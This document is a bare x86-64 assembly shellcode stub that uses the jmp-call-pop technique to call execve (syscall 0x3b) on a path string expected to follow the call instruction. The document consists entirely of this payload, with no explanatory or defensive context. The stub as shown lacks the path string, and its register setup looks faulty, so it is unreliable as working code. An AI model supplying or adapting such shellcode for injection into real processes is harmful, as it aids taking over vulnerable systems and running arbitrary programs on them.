BITS 64
jmp short jukebox
shellcode:
	xor    rax, rax
	mov    al, 0x3b
	pop    rdi
	mov    rdx, rdi
	push   rdx
	mov    rsi, rsp
	syscall
jukebox:
	call shellcode
